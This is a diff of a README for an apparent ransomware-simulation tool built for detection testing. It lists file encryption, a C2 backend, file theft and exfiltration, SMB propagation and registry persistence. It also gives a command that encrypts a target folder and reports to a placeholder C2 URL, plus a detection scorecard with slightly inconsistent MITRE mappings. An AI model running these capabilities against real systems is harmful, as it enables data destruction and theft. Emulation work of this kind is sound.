@@ -1,5 +1,5 @@
 ```text
- █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
+█████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
 ██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔═══██╗
 ███████║██████╔╝█████╗   ╚███╔╝      ██████╔╝██████╔╝██║   ██║
 ██╔══██║██╔═══╝ ██╔══╝   ██╔██╗      ██╔═══╝ ██╔══██╗██║   ██║
@@ -20,14 +20,14 @@
 2. Features & Architecture
 --------------------------
 
-    2. FEATURES ARCHITECTURE
-------------------------
     * Cryptography: AES-256-CBC per-file encryption using native .NET 
       providers for high-entropy security simulation.
     * Multi-Victim C2: Asynchronous Python backend utilizing Quart and 
       aiosqlite for scalable, persistent victim tracking.
     * Stealth Exfiltration: Metadata manifests are AES-encrypted locally 
       before being tunneled through HTTPS (TLS 1.2+).
+    * Data Theft (T1041): Automated discovery and exfiltration of sensitive 
+      files (.xlsx, .pdf, .docx) via Base64-encoded binary streams.
     * Lateral Propagation: Automated discovery and infection of mapped 
       SMB/Network drives (T1135).
     * Persistence: Registry Run Key hijacking (T1547.001) ensuring 
@@ -58,7 +58,7 @@
 
     [C] Simulation Execution
 
-        Phase 1: Impact (Encryption & Exfiltration)
+        Phase 1: Impact (Theft, Encryption & Exfiltration)
           .\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"
 
         Phase 2: Recovery (Decryption)
@@ -103,11 +103,12 @@
     Simulation ID: APEX-2026-###
     Target Host: [Hostname]
 
-    | Phase              | Technique | Alert Triggered? | TTD (Min) |
+    | Phase               | Technique | Alert Triggered? | TTD (Min) |
     | :---               | :---      | :---             | :---      |
     | Persistence        | T1547.001 | [YES/NO]         | [ ]       |
     | Lateral Movement   | T1135     | [YES/NO]         | [ ]       |
-    | Exfiltration       | T1041     | [YES/NO]         | [ ]       |
+    | Data Theft         | T1041     | [YES/NO]         | [ ]       |
+    | Exfiltration       | T1011     | [YES/NO]         | [ ]       |
     | Canary Trip        | Honey-pot | [YES/NO]         | [ ]       |
     | Encryption         | T1486     | [YES/NO]         | [ ]       |
     | Internal Defacement| T1491.001 | [YES/NO]         | [ ]       |
@@ -129,4 +130,3 @@
     no liability for any data loss, system damage, legal consequences, 
     or misuse of the framework. By using this software, you agree to 
     operate within the legal boundaries of your jurisdiction.
-================================================================
